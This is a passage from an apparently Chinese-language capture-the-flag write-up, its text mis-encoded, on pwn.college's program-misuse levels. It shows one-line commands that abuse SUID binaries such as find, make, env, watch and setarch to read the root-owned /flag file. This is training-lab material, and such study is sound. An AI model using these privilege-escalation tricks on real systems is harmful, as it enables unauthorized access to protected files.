<p><code>for option in $(genisoimage --help 2&gt;&amp;1 | grep FILE | awk '&#123;print $1&#125;'); do echo $option; genisoimage $option /flag; done</code></p>
<p>æµ‹è¯•å‘ç°ï¼Œå¯ä»¥ç”¨<code>sort</code>æŒ‡ä»¤æ‰“å°å‡º<code>flag</code>,äº‹å®ä¸Šæˆ‘è®¤ä¸ºè¿™ä¸ªæ¼æ´æˆå› æ˜¯ï¼Œ-sort é€‰é¡¹æ˜¯åˆ¶å®šæ–‡ä»¶å’Œç›®å½•çš„æ’åºé¡ºåºï¼Œä½†æ˜¯<code>flag</code>æ–‡ä»¶æ˜¯ä¸æ­£ç¡®çš„æ ¼å¼ï¼Œgenisoimageä¼šè¯»å–æ–‡ä»¶ï¼Œå¹¶ä¸”å°†æŠ¥é”™ä¿¡æ¯ï¼ˆåŒ…å«äº†æ–‡ä»¶å†…å®¹ï¼‰æ‰“å°åˆ°ç»ˆç«¯</p>
<p>äºæ˜¯æ­£ç¡®çš„<code>payload</code>:<code>genisoimage -sort flag</code></p>
<h3 id="level24env"><a class="markdownIt-Anchor" href="#level24env"></a> level24(env)</h3>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/env/">env | GTFOBins</a></p>
<p><code>env</code>æ˜¯ä¸€ä¸ªç”¨äºåœ¨å½“å‰ç¯å¢ƒä¸­æ‰§è¡Œå‘½ä»¤çš„å®ç”¨å·¥å…·ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºå‘½ä»¤è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œç„¶åæ‰§è¡Œè¯¥å‘½ä»¤ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œ<code>env</code>çš„åŠŸèƒ½å’Œç”¨æ³•å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†å®ƒé€šå¸¸ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li>
<p><strong>è®¾ç½®ç¯å¢ƒå˜é‡</strong>ï¼šé€šè¿‡<code>env</code>å‘½ä»¤å¯ä»¥è®¾ç½®å‘½ä»¤æ‰§è¡Œæ—¶æ‰€éœ€çš„ç¯å¢ƒå˜é‡ã€‚è¿™äº›å˜é‡å¯ä»¥åŒ…æ‹¬è·¯å¾„ã€è¯­è¨€ã€ç¼–è¯‘å™¨é€‰é¡¹ç­‰ã€‚</p>
</li>
<li>
<p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼š<code>env</code>è¿˜å¯ä»¥ç”¨æ¥æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰è®¾ç½®å¥½æ‰€éœ€çš„ç¯å¢ƒå˜é‡ã€‚</p>
</li>
<li>
<p><strong>æŸ¥è¯¢å½“å‰ç¯å¢ƒå˜é‡</strong>ï¼šåœ¨ä¸æŒ‡å®šå‘½ä»¤çš„æƒ…å†µä¸‹ï¼Œ<code>env</code>ä¼šæ‰“å°å½“å‰ç¯å¢ƒä¸­å·²è®¾ç½®çš„æ‰€æœ‰å˜é‡ã€‚</p>
</li>
</ol>
<p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ç”¨æ³•ï¼š</p>
<ul>
<li>
<p><strong>è®¾ç½®ç¯å¢ƒå˜é‡å¹¶æ‰§è¡Œå‘½ä»¤</strong>ï¼š<code>env VAR=value command</code>ã€‚è¿™å°†ä¸´æ—¶è®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡<code>VAR</code>çš„å€¼ä¸º<code>value</code>ï¼Œç„¶åæ‰§è¡Œ<code>command</code>ã€‚</p>
</li>
<li>
<p><strong>æŸ¥è¯¢å½“å‰ç¯å¢ƒå˜é‡</strong>ï¼š<code>env</code>ã€‚è¿™å°†æ‰“å°å½“å‰ç¯å¢ƒä¸­æ‰€æœ‰å·²è®¾ç½®çš„å˜é‡åŠå…¶å€¼ã€‚</p>
</li>
<li>
<p><strong>è®¾ç½®å¤šä¸ªç¯å¢ƒå˜é‡</strong>ï¼š<code>env VAR1=value1 VAR2=value2 command</code>ã€‚è¿™å°†è®¾ç½®å¤šä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ã€‚</p>
</li>
<li>
<p><strong>åœ¨è„šæœ¬ä¸­ä½¿ç”¨</strong>ï¼š<code>#!/usr/bin/env python</code>ã€‚è¿™æ˜¯è„šæœ¬ä¸­å¸¸è§çš„ç”¨æ³•ï¼Œå®ƒå‘Šè¯‰ç³»ç»Ÿå»<code>/usr/bin</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>python</code>è§£é‡Šå™¨ï¼Œå¹¶ç”¨å®ƒæ¥æ‰§è¡Œè„šæœ¬ã€‚</p>
</li>
</ul>
<p><code>env cat flag</code></p>
<h3 id="level25find"><a class="markdownIt-Anchor" href="#level25find"></a> level25(find)</h3>
<p><code>find</code>ä¹Ÿå¯ç”¨äºå‘½ä»¤æ‰§è¡Œ</p>
<p>å¸¸è§çš„<code>find</code>å‘½ä»¤é€‰é¡¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>-name</code>ï¼šæ ¹æ®æ–‡ä»¶åè¿›è¡Œæœç´¢ã€‚</li>
<li><code>-type</code>ï¼šæ ¹æ®æ–‡ä»¶ç±»å‹è¿›è¡Œæœç´¢ï¼Œå¦‚æ™®é€šæ–‡ä»¶ï¼ˆ<code>f</code>ï¼‰ã€ç›®å½•ï¼ˆ<code>d</code>ï¼‰ç­‰ã€‚</li>
<li><code>-perm</code>ï¼šæ ¹æ®æ–‡ä»¶æƒé™è¿›è¡Œæœç´¢ã€‚</li>
<li><code>-user</code>ï¼šæ ¹æ®æ–‡ä»¶æ‰€æœ‰è€…è¿›è¡Œæœç´¢ã€‚</li>
<li><code>-group</code>ï¼šæ ¹æ®æ–‡ä»¶æ‰€å±ç»„è¿›è¡Œæœç´¢ã€‚</li>
<li><code>-size</code>ï¼šæ ¹æ®æ–‡ä»¶å¤§å°è¿›è¡Œæœç´¢ã€‚</li>
<li><code>-mtime</code>ã€<code>-atime</code>ã€<code>-ctime</code>ï¼šæ ¹æ®æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ã€è®¿é—®æ—¶é—´ã€çŠ¶æ€æ”¹å˜æ—¶é—´è¿›è¡Œæœç´¢ã€‚</li>
</ul>
<p>å¸¸è§çš„<code>find</code>å‘½ä»¤æ“ä½œåŒ…æ‹¬ï¼š</p>
<ul>
<li><code>-print</code>ï¼šæ‰“å°åŒ¹é…çš„æ–‡ä»¶åã€‚</li>
<li><code>-exec</code>ï¼šå¯¹åŒ¹é…çš„æ–‡ä»¶æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œè¦åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾æ‰€æœ‰æ‰©å±•åä¸º<code>.txt</code>çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">lua
Copy code
find . -type f -name &quot;*.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>è¿™å°†åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾æ‰€æœ‰æ‰©å±•åä¸º<code>.txt</code>çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶æ‰“å°å®ƒä»¬çš„æ–‡ä»¶åã€‚</p>
<p><code>find</code>å‘½ä»¤éå¸¸çµæ´»ï¼Œå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚ç»„åˆä¸åŒçš„é€‰é¡¹å’Œæ“ä½œæ¥å®ç°å„ç§æœç´¢ä»»åŠ¡ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /flag <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li><code>find .</code>ï¼šåœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ã€‚</li>
<li><code>-exec cat /flag \;</code>ï¼šå¯¹äºæ¯ä¸€ä¸ªæ‰¾åˆ°çš„æ–‡ä»¶ï¼Œæ‰§è¡Œ<code>cat /flag</code>å‘½ä»¤ã€‚<code>&#123;&#125;</code>é€šå¸¸ç”¨æ¥è¡¨ç¤º<code>find</code>å‘½ä»¤æ‰¾åˆ°çš„æ–‡ä»¶åï¼Œè€Œ<code>\;</code>è¡¨ç¤º<code>-exec</code>é€‰é¡¹çš„ç»“æŸã€‚</li>
<li><code>-quit</code>ï¼šåœ¨æ‰§è¡Œç¬¬ä¸€ä¸ª <code>-exec</code> åç«‹å³åœæ­¢æŸ¥æ‰¾ï¼Œå³ä½¿è¿˜æœ‰æœªæœç´¢çš„ç›®å½•æˆ–æ–‡ä»¶ã€‚</li>
</ul>
<h3 id="level26make"><a class="markdownIt-Anchor" href="#level26make"></a> level26(make)</h3>
<p>[pwn.college-program-misuse-writeup/Babysuid <a target="_blank" rel="noopener" href="http://26.md">26.md</a> at main Â· M4700F/pwn.college-program-misuse-writeup (<a target="_blank" rel="noopener" href="http://github.com">github.com</a>)](<a target="_blank" rel="noopener" href="https://github.com/M4700F/pwn.college-program-misuse-writeup/blob/main/Babysuid">https://github.com/M4700F/pwn.college-program-misuse-writeup/blob/main/Babysuid</a> <a target="_blank" rel="noopener" href="http://26.md">26.md</a>)</p>
<p>ç®€æ´ç‰ˆ:</p>
<p><code>COMMAND='cat /flag';make -s --eval=$'x:\n\t-'&quot;$COMMAND&quot;</code></p>
<ul>
<li><code>$'x:\n\t-'&quot;$COMMAND&quot;</code> å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>x</code> çš„ç›®æ ‡ï¼Œåœ¨è¿™ä¸ªç›®æ ‡ä¸‹æ‰§è¡Œäº†ç”± <code>COMMAND</code> å˜é‡å®šä¹‰çš„å‘½ä»¤ã€‚</li>
<li><code>COMMAND='cat /flag'</code> å°† <code>cat /flag</code> å­—ç¬¦ä¸²èµ‹ç»™äº† <code>COMMAND</code> å˜é‡ï¼Œå³ <code>COMMAND</code> å˜é‡ç°åœ¨ä»£è¡¨äº† <code>cat /flag</code> å‘½ä»¤ã€‚</li>
<li><code>make -s --eval=...</code> å‘½ä»¤å°† <code>-s</code> å‚æ•°ç”¨äºé™é»˜æ‰§è¡Œï¼Œ<code>--eval</code> å‚æ•°ç”¨äºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è®¾ç½® <code>x</code> ç›®æ ‡ä¸‹çš„å‘½ä»¤ä¸º <code>cat /flag</code>ã€‚</li>
</ul>
<p>When you execute a command from a makefile which has been granted the <code>SUID</code> bit, the command inherits the permission of the root user. So when we run the <code>cat /flag</code>, as if we were the <code>root</code> user. Thatâ€™s why it prints the flag.</p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç¼–å†™ä¸€ä¸ª<code>makefile</code></p>
<pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">build</span><span class="token punctuation">:</span>
	gcc test.c -o test
	ls ./test
	cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åç›´æ¥<code>make</code>å³å¯</p>
<h3 id="level27nice"><a class="markdownIt-Anchor" href="#level27nice"></a> level27(nice)</h3>
<p><code>nice</code> æ˜¯ä¸€ä¸ªç”¨äºè°ƒæ•´è¿›ç¨‹ä¼˜å…ˆçº§çš„å‘½ä»¤ã€‚åœ¨Unixå’Œç±»Unixç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³çš„ä¼˜å…ˆçº§ï¼Œç”¨äºå†³å®šå®ƒåœ¨ç³»ç»Ÿèµ„æºåˆ†é…ä¸­çš„ä½ç½®ã€‚<code>nice</code> å‘½ä»¤å…è®¸ä½ åœ¨è¿è¡Œå‘½ä»¤æ—¶ä¿®æ”¹è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ <code>nice</code> å‘½ä»¤çš„ä¸€äº›å¸¸è§ç”¨æ³•ï¼š</p>
<ol>
<li>
<p><strong>è®¾ç½®è¿›ç¨‹ä¼˜å…ˆçº§</strong>ï¼šæœ€ç®€å•çš„ç”¨æ³•æ˜¯å°† <code>nice</code> å‘½ä»¤ä¸è¦æ‰§è¡Œçš„å‘½ä»¤ä¸€èµ·ä½¿ç”¨ã€‚é€šè¿‡åœ¨å‘½ä»¤å‰åŠ ä¸Š <code>nice</code> å‘½ä»¤ï¼Œä½ å¯ä»¥ä½¿å¾—è¯¥å‘½ä»¤ä»¥è¾ƒä½çš„ä¼˜å…ˆçº§è¿è¡Œã€‚ä¾‹å¦‚ï¼š</p>
 <pre class="line-numbers language-none"><code class="language-none">nice -n 10 command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>command</code> è¿›ç¨‹çš„ä¼˜å…ˆçº§é™ä½åˆ° 10ã€‚æ•°å€¼èŒƒå›´é€šå¸¸æ˜¯ -20ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰åˆ° 19ï¼ˆæœ€ä½ä¼˜å…ˆçº§ï¼‰ï¼Œ0 æ˜¯é»˜è®¤ä¼˜å…ˆçº§ã€‚</p>
</li>
<li>
<p><strong>æŸ¥çœ‹è¿›ç¨‹ä¼˜å…ˆçº§</strong>ï¼šä½ å¯ä»¥ä½¿ç”¨ <code>ps</code> å‘½ä»¤æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚ä¾‹å¦‚ï¼š</p>
 <pre class="line-numbers language-none"><code class="language-none">ps -eo pid,ni,cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šæ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„ PIDã€ä¼˜å…ˆçº§å€¼å’Œå‘½ä»¤ã€‚</p>
</li>
<li>
<p><strong>æé«˜è¿›ç¨‹ä¼˜å…ˆçº§</strong>ï¼šå¦‚æœä½ æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>renice</code> å‘½ä»¤æ¥æé«˜æˆ–é™ä½å·²ç»è¿è¡Œä¸­è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚ä¾‹å¦‚ï¼š</p>
 <pre class="line-numbers language-none"><code class="language-none">renice -n -5 -p PID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† PID æ‰€ä»£è¡¨çš„è¿›ç¨‹çš„ä¼˜å…ˆçº§é™ä½ 5 ä¸ªçº§åˆ«ã€‚</p>
</li>
<li>
<p><strong>åŒæ—¶è®¾ç½® nice å€¼å’Œè°ƒç”¨ä¼˜å…ˆçº§</strong>ï¼šä½ ä¹Ÿå¯ä»¥åŒæ—¶ä½¿ç”¨ <code>nice</code> å’Œ <code>renice</code> å‘½ä»¤ã€‚<code>nice</code> å‘½ä»¤ç”¨äºè®¾ç½®è°ƒç”¨çš„ä¼˜å…ˆçº§ï¼Œè€Œ <code>renice</code> å‘½ä»¤ç”¨äºæ”¹å˜å·²ç»è¿è¡Œçš„è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</p>
</li>
</ol>
<p><code>nice -n 10 cat /flag</code></p>
<p>è¿™é‡Œçš„ <code>n</code>å¯ä»¥æ˜¯<code>-20~19</code>çš„ä»»æ„æ•´æ•°ï¼Œæ­£æ•°ä¼šæé«˜è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚è¿™ä¼šå¯¼è‡´ç³»ç»Ÿæ›´é¢‘ç¹åœ°ä¸ºè¯¥è¿›ç¨‹åˆ†é… CPU æ—¶é—´ï¼Œä»è€Œä½¿å¾—è¯¥è¿›ç¨‹æ›´å¿«åœ°æ‰§è¡Œã€‚</p>
<p>å¦‚æœè¿™é‡Œnå–è´Ÿæ•°ä¼šå¯¼è‡´æ²¡æœ‰æƒé™è·å¾—<code>flag</code>,åŸå› å¾…è§£å†³</p>
<h3 id="level28timeout"><a class="markdownIt-Anchor" href="#level28timeout"></a> level28(timeout)</h3>
<p>timeoutå‘½ä»¤ä½œç”¨æ˜¯è¿è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œå¦‚æœåœ¨æŒ‡å®šæ—¶é—´ååœ¨è¿è¡Œåˆ™æ€æ­»è¯¥è¿›ç¨‹ã€‚</p>
<p><code>timeout 114514s cat /flag</code></p>
<h3 id="level29stdbuf"><a class="markdownIt-Anchor" href="#level29stdbuf"></a> level29(stdbuf)</h3>
<p><code>stdbuf</code> æ˜¯ä¸€ä¸ªç”¨äºä¿®æ”¹æ ‡å‡† I/O ç¼“å†²æ–¹å¼çš„å‘½ä»¤ï¼Œå®ƒå…è®¸ä½ åœ¨è¿è¡Œå‘½ä»¤æ—¶æ§åˆ¶æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯çš„ç¼“å†²è¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯ <code>stdbuf</code> å‘½ä»¤çš„ä¸€äº›å¸¸ç”¨å‚æ•°ï¼š</p>
<ol>
<li>
<p><code>-i MODE</code> æˆ– <code>--input=MODE</code>ï¼šæŒ‡å®šæ ‡å‡†è¾“å…¥çš„ç¼“å†²æ¨¡å¼ã€‚å¯ä»¥ä½¿ç”¨ <code>MODE</code> å‚æ•°æ¥æŒ‡å®šæ ‡å‡†è¾“å…¥çš„ç¼“å†²æ¨¡å¼ï¼Œå¯é€‰å€¼åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>0</code>ï¼šæ— ç¼“å†²ã€‚</li>
<li><code>L</code>ï¼šè¡Œç¼“å†²ï¼ˆæŒ‰è¡Œåˆ·æ–°ï¼‰ã€‚</li>
<li><code>N</code>ï¼šå—ç¼“å†²ï¼ˆæŒ‰å—åˆ·æ–°ï¼‰ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œ<code>-i0</code> è¡¨ç¤ºç¦ç”¨æ ‡å‡†è¾“å…¥çš„ç¼“å†²ï¼Œ<code>-iL</code> è¡¨ç¤ºä½¿ç”¨è¡Œç¼“å†²æ¨¡å¼ã€‚</p>
</li>
<li>
<p><code>-o MODE</code> æˆ– <code>--output=MODE</code>ï¼šæŒ‡å®šæ ‡å‡†è¾“å‡ºçš„ç¼“å†²æ¨¡å¼ã€‚ä¸ <code>-i</code> ç±»ä¼¼ï¼Œå¯ä»¥ä½¿ç”¨ <code>MODE</code> å‚æ•°æ¥æŒ‡å®šæ ‡å‡†è¾“å‡ºçš„ç¼“å†²æ¨¡å¼ï¼Œå¯é€‰å€¼åŒæ ·åŒ…æ‹¬ <code>0</code>ã€<code>L</code> å’Œ <code>N</code>ã€‚</p>
</li>
<li>
<p><code>-e MODE</code> æˆ– <code>--error=MODE</code>ï¼šæŒ‡å®šæ ‡å‡†é”™è¯¯è¾“å‡ºçš„ç¼“å†²æ¨¡å¼ã€‚ä¸ <code>-i</code> å’Œ <code>-o</code> ç±»ä¼¼ï¼Œå¯ä»¥ä½¿ç”¨ <code>MODE</code> å‚æ•°æ¥æŒ‡å®šæ ‡å‡†é”™è¯¯è¾“å‡ºçš„ç¼“å†²æ¨¡å¼ï¼Œå¯é€‰å€¼åŒæ ·åŒ…æ‹¬ <code>0</code>ã€<code>L</code> å’Œ <code>N</code>ã€‚</p>
</li>
<li>
<p><code>-i0 -o0 -e0</code>ï¼šç¦ç”¨æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯çš„ç¼“å†²ï¼Œè¿™ç›¸å½“äºåœ¨ä½¿ç”¨ç®¡é“ç­‰æ“ä½œæ—¶å®æ—¶è¾“å‡ºï¼Œé€‚ç”¨äºå®æ—¶æ—¥å¿—è¾“å‡ºç­‰åœºæ™¯ã€‚</p>
</li>
</ol>
<p><code>stdbuf -i0 cat /flag</code></p>
<h3 id="level30setarch"><a class="markdownIt-Anchor" href="#level30setarch"></a> level30(setarch)</h3>
<p><code>setarch</code> å‘½ä»¤ç”¨äºè®¾ç½®æ¶æ„ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥ä¾¿åœ¨ä¸åŒçš„ç³»ç»Ÿæ¶æ„ä¹‹é—´è¿›è¡Œè¿è¡Œæ—¶åˆ‡æ¢ã€‚å®ƒé€šå¸¸ç”¨äºæ¨¡æ‹Ÿä¸åŒæ¶æ„çš„ç¯å¢ƒï¼Œä¾‹å¦‚åœ¨ x86 ç³»ç»Ÿä¸Šæ¨¡æ‹Ÿ ARM ç³»ç»Ÿã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>setarch</code> å‘½ä»¤å‚æ•°ï¼š</p>
<ol>
<li><code>-h</code> æˆ– <code>--help</code>ï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼Œåˆ—å‡º <code>setarch</code> å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•å’Œé€‰é¡¹ã€‚</li>
<li><code>-L</code> æˆ– <code>--list</code>ï¼šåˆ—å‡ºç³»ç»Ÿæ”¯æŒçš„æ‰€æœ‰æ¶æ„ã€‚è¿™ä¸ªé€‰é¡¹å¯ä»¥ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿæ”¯æŒçš„æ‰€æœ‰æ¶æ„åˆ—è¡¨ã€‚</li>
<li><code>-R</code> æˆ– <code>--rpath</code>ï¼šè®¾ç½®è¿è¡Œæ—¶é“¾æ¥å™¨è·¯å¾„ã€‚è¿™ä¸ªé€‰é¡¹ç”¨äºæŒ‡å®šç¨‹åºè¿è¡Œæ—¶é“¾æ¥å™¨çš„è·¯å¾„ã€‚</li>
<li><code>-B</code> æˆ– <code>--bind</code>ï¼šç»‘å®šæŒ‡å®šçš„ç¨‹åºåˆ°ç‰¹å®šçš„æ¶æ„ã€‚ä¾‹å¦‚ï¼Œ<code>setarch -B arm /bin/bash</code> å°† <code>/bin/bash</code> ç»‘å®šåˆ° ARM æ¶æ„ã€‚</li>
<li><code>-Q</code> æˆ– <code>--query</code>ï¼šæŸ¥è¯¢æŒ‡å®šç¨‹åºçš„æ¶æ„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œ<code>setarch -Q /bin/bash</code> å°†æ˜¾ç¤º <code>/bin/bash</code> çš„æ¶æ„ä¿¡æ¯ã€‚</li>
</ol>
<p><code>setarch $(arch) cat /flag</code></p>
<ul>
<li><code>$(arch)</code> ä¼šè¿”å›å½“å‰ç³»ç»Ÿçš„æ¶æ„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œåœ¨ x86 ç³»ç»Ÿä¸Šï¼Œ<code>$(arch)</code> å¯èƒ½ä¼šè¿”å› <code>x86_64</code>ï¼ˆ64 ä½ï¼‰æˆ– <code>i386</code>ï¼ˆ32 ä½ï¼‰ç­‰ã€‚</li>
<li><code>setarch</code> å‘½ä»¤ç”¨äºè®¾ç½®è¿è¡Œæ—¶çš„ç³»ç»Ÿæ¶æ„ã€‚</li>
<li><code>cat /flag</code> å‘½ä»¤ç”¨äºæ‰“å° <code>/flag</code> æ–‡ä»¶çš„å†…å®¹åˆ°æ ‡å‡†è¾“å‡ºã€‚</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level30:/challenge$ setarch <span class="token parameter variable">--li</span>
uname26
linux32
linux64
i386
i486
i586
i686
athlon
x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level31watch"><a class="markdownIt-Anchor" href="#level31watch"></a> level31(watch)</h3>
<p><code>watch</code> æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºå‘¨æœŸæ€§åœ°æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œå¹¶å°†å…¶è¾“å‡ºæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šã€‚å®ƒå¯ä»¥å¸®åŠ©ä½ ç›‘è§†å‘½ä»¤çš„è¾“å‡ºï¼Œå¹¶å®šæœŸåˆ·æ–°æ˜¾ç¤ºç»“æœï¼Œä»è€Œå®æ—¶æŸ¥çœ‹å‘½ä»¤çš„æ‰§è¡Œæƒ…å†µã€‚</p>
<p><code>watch</code> å‘½ä»¤çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">watch [options] command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å…¶ä¸­ï¼Œ<code>command</code> æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€Œ <code>[options]</code> æ˜¯ä¸€äº›é€‰é¡¹ï¼Œç”¨äºæŒ‡å®š <code>watch</code> å‘½ä»¤çš„è¡Œä¸ºã€‚</p>
<p>ä¸€äº›å¸¸è§çš„ <code>watch</code> å‘½ä»¤é€‰é¡¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>-n, --interval</code>ï¼šæŒ‡å®šåˆ·æ–°é—´éš”æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚é»˜è®¤é—´éš”æ—¶é—´æ˜¯ 2 ç§’ã€‚</li>
<li><code>-d, --differences</code>ï¼šä»…æ˜¾ç¤ºä¸ä¸Šæ¬¡è¾“å‡ºä¸åŒçš„å†…å®¹ã€‚è¿™ä¸ªé€‰é¡¹å¯ä»¥å¸®åŠ©ä½ å¿«é€Ÿåœ°æŸ¥çœ‹è¾“å‡ºçš„å˜åŒ–ã€‚</li>
<li><code>-t, --no-title</code>ï¼šä¸æ˜¾ç¤ºæ ‡é¢˜è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>watch</code> ä¼šåœ¨é¡¶éƒ¨æ˜¾ç¤ºä¸€ä¸ªæ ‡é¢˜è¡Œï¼Œæ˜¾ç¤ºå½“å‰æ—¶é—´å’Œæ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤ã€‚</li>
<li><code>-h, --help</code>ï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼Œåˆ—å‡º <code>watch</code> å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•å’Œé€‰é¡¹ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œè¦ç›‘è§†ç³»ç»Ÿå½“å‰çš„æ—¶é—´å˜åŒ–ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">watch date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šæ¯éš” 2 ç§’æ‰§è¡Œä¸€æ¬¡ <code>date</code> å‘½ä»¤ï¼Œå¹¶å°†å…¶è¾“å‡ºæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šï¼Œå®æ—¶æ›´æ–°ç³»ç»Ÿå½“å‰çš„æ—¶é—´ã€‚</p>
<p><code>watch -x cat /flag</code></p>
<h3 id="level32socat"><a class="markdownIt-Anchor" href="#level32socat"></a> level32(socat)</h3>
<p><code>socat</code> çš„é€‰é¡¹å’Œå‚æ•°éå¸¸å¤šï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„é€‰é¡¹å’Œå‚æ•°ï¼š</p>
<ul>
<li><code>-h</code>ï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼Œåˆ—å‡º <code>socat</code> å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•å’Œé€‰é¡¹ã€‚</li>
<li><code>-V</code>ï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ <code>socat</code> çš„ç‰ˆæœ¬å·ã€‚</li>
<li><code>-d</code>ï¼šå¯ç”¨è°ƒè¯•æ¨¡å¼ï¼Œæ˜¾ç¤ºæ›´è¯¦ç»†çš„è°ƒè¯•ä¿¡æ¯ã€‚</li>
<li><code>-v</code>ï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ­£åœ¨è¿›è¡Œçš„è¿æ¥å’Œæ•°æ®ä¼ è¾“çš„è¯¦ç»†ä¿¡æ¯ã€‚</li>
<li><code>-t &lt;time&gt;</code>ï¼šè®¾ç½®è¶…æ—¶æ—¶é—´ï¼ŒæŒ‡å®š <code>socat</code> åœ¨è¿æ¥å»ºç«‹æˆ–æ•°æ®ä¼ è¾“æ—¶ç­‰å¾…çš„æœ€å¤§æ—¶é—´ã€‚</li>
